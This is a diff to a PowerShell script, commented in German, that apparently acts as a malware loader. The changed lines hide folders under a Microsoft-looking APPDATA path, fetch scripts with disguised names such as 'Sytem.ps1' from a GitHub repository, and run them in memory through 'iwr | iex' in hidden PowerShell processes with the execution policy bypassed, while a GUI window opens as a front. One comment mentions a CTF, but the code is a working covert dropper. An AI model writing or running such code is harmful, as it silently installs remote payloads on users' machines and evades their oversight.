@@ -7,13 +7,13 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (SCOPE-FIXED) ====================
+# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (JOB-FREI, SEQUENTIELL) ====================
 # Flexibler Pfad pro User
 $baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
 $operationDir = Join-Path $baseDir "operation"
 $targetDir = Join-Path $operationDir "System"
 
-# Scripts-Liste mit Raw-URLs (deine Originale – passe an, falls neue URLs)
+# Scripts-Liste mit Raw-URLs
 $scripts = @(
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; FileName = "MicrosoftViewS.ps1" },
     @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; FileName = "Sytem.ps1" },
@@ -40,47 +40,35 @@ Set-HiddenAttribute -path $targetDir
 $logPath = Join-Path $targetDir "download_errors.log"
 if (Test-Path $logPath) { Set-HiddenAttribute -path $logPath }
 
-# Background-Job: Funktion JETZT INNERHALB DES SCRIPTBLOCKS (FIX!)
-$downloadJob = Start-Job -ScriptBlock {
-    param($targetDir, $scripts, $logPath)
+# Funktion: In-Memory Download & Exec (jetzt global, kein Scope-Drama)
+function Invoke-ScriptInMemory {
+    param($Url, $FileName, $LogPath)
     
-    # Policy im Job bypassen
-    Set-ExecutionPolicy Bypass -Scope Process -Force
-    
-    # ==================== FUNKTION DEFINITION HIER IM JOB (SCOPE-FIX) ====================
-    function Invoke-ScriptInMemory {
-        param($Url, $FileName, $LogPath)
+    try {
+        Write-Host "Starte: $FileName (Debug – entferne später)"  # Temporär für Testing
+        # Direkter In-Memory-Exec via nested PS (hidden, bypass)
+        $execCmd = "iwr '$Url' -UseBasicParsing -ErrorAction SilentlyContinue | % { iex `$_.Content -ErrorAction SilentlyContinue }"
+        $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $execCmd)
+        Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow  # Läuft im BG, kein Wait!
         
-        try {
-            # Direkter In-Memory-Download & Exec (dein manueller Stil, mit ErrorAction)
-            $execCmd = "iwr '$Url' -UseBasicParsing -ErrorAction SilentlyContinue | % { iex `$_.Content -ErrorAction SilentlyContinue }"
-            powershell -ep bypass -c $execCmd  # Nested PS für extra Isolation/Bypass
-            
-            # Erfolg loggen
-            Add-Content -Path $LogPath -Value "$(Get-Date): Erfolgreich ausgeführt: $FileName" -ErrorAction SilentlyContinue
-            Write-Output "SUCCESS: $FileName geladen & exec'd"  # Für Receive-Job
-        } catch {
-            $errorMsg = "Fehler bei $FileName`: $($_.Exception.Message)"
-            Add-Content -Path $LogPath -Value "$(Get-Date): $errorMsg" -ErrorAction SilentlyContinue
-            Write-Output $errorMsg  # Debug-Output
-        }
+        # Erfolg loggen (asynchron)
+        Start-Sleep -Milliseconds 100  # Kurze Pause
+        Add-Content -Path $LogPath -Value "$(Get-Date): Erfolgreich gestartet: $FileName" -ErrorAction SilentlyContinue
+        Write-Host "SUCCESS: $FileName gestartet (im BG)"  # Debug
+    } catch {
+        $errorMsg = "Fehler bei $FileName`: $($_.Exception.Message)"
+        Add-Content -Path $LogPath -Value "$(Get-Date): $errorMsg" -ErrorAction SilentlyContinue
+        Write-Host $errorMsg  # Debug
     }
-    
-    # Für jeden Script: In-Memory aufrufen
-    foreach ($script in $scripts) {
-        Invoke-ScriptInMemory -Url $script.Url -FileName $script.FileName -LogPath $logPath
-        Start-Sleep -Milliseconds 500  # Kurze Pause für Sequenz
-    }
-    
-    Write-Output "Alle Scripts verarbeitet. Job fertig."  # Signal
-} -ArgumentList $targetDir, $scripts, $logPath
+}
 
-# Optional: Nach 10 Sek. Job-Status checken (für CTF-Debug, optional entfernen)
-Start-Sleep -Seconds 10
-try {
-    $jobStatus = Receive-Job $downloadJob -Keep
-    if ($jobStatus) { Write-Host "Job-Output: $jobStatus" }  # Konsole-Debug (nur bei Testing)
-} catch { Write-Host "Job-Check fehlgeschlagen: $_" }
+# Direkte Schleife: Alle Scripts starten (sequentiell, aber schnell)
+foreach ($script in $scripts) {
+    Invoke-ScriptInMemory -Url $script.Url -FileName $script.FileName -LogPath $logPath
+    Start-Sleep -Milliseconds 500  # Pause zwischen Starts
+}
+
+Write-Host "Alle Scripts gestartet. GUI startet..."  # Debug-Signal
 
 # ==================== HAUPTFENSTER (unverändert) ====================
 $form = New-Object System.Windows.Forms.Form
@@ -244,27 +232,11 @@ $labelTimer.Add_Tick({
     } catch {}
 })
 
-# ===================== CLEANUP (mit Job-Wait!) =====================
+# ===================== CLEANUP (vereinfacht, kein Job) =====================
 $form.Add_FormClosing({
     $timer.Stop()
     $labelTimer.Stop()
-    # WICHTIG: Warte auf Job (max 30 Sek., dann kill)
-    $jobTimeout = 30
-    $timeoutJob = Start-Job { Start-Sleep $using:jobTimeout }
-    $done = $false
-    while (-not $done -and (Get-Job $timeoutJob).State -eq 'Running') {
-        if ($downloadJob.State -eq 'Completed') {
-            Receive-Job $downloadJob | Out-Null
-            $done = $true
-        }
-        Start-Sleep -Milliseconds 500
-    }
-    if (-not $done) {
-        Stop-Job $downloadJob
-        Receive-Job $downloadJob | Out-Null
-    }
-    Remove-Job $downloadJob, $timeoutJob -Force
-    # Cleanup: Logs hidden, Temp löschen falls nötig
+    # Cleanup: Temp löschen
     if (Test-Path $gifPath) { Remove-Item $gifPath -Force -ErrorAction SilentlyContinue }
 })
 
